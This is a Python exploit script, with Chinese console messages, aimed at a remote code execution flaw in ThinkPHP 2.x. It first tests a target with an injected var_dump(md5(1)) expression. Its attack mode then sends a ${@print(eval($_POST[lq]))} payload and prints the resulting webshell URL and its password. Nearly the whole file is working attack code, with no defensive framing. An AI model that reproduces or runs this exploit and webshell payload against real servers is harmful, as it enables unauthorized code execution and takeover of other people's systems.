import argparse
import re
import sys
import urllib

import requests


def verify(url):
    relsult = {
        'name': 'Thinkphp 2.x rce',
        'vulnerable': False,
        'attack': True,
    }
    try:
        payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
        response = requests.get(payload, timeout=3)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
            relsult['attack'] = True
        return relsult
    except:
        return relsult


def attack(url):
    try:
        print('开始利用tp2rce')
        payload = r'/index.php?s=a/b/c/${@print(eval($_POST[lq]))}'
        webshell = urllib.parse.urljoin(url, payload)
        if requests.get(webshell, timeout=10).status_code == 200:
            print('webshell地址为:' + str(webshell))
            print('密码:lq')
            return True
        else:
            return False
    except:
        return False


def start_verify(self):
    s2 = verify(self)
    print(s2['name'] + str(' ' + str(s2['vulnerable'])))
    print('payload: ' + str(s2['payload']))


if __name__ == '__main__':
    print('''--❤ tp2rce_scan ❤--''')

parser = argparse.ArgumentParser(description='tp2rce')
parser.add_argument('-url', type=str, help="输入目标链接")
parser.add_argument('-attack', type=str, help='执行EXP')
args = parser.parse_args()

try:
    if '-url' in sys.argv:
        print('漏洞检测')
        print()
        start_verify(args.url)
        print()
        print('漏洞检测结束')
    if '-attack' in sys.argv:
        print('漏洞利用')
        print()
        attack(args.attack)
        print()
        print('漏洞利用结束')
except:
    pass
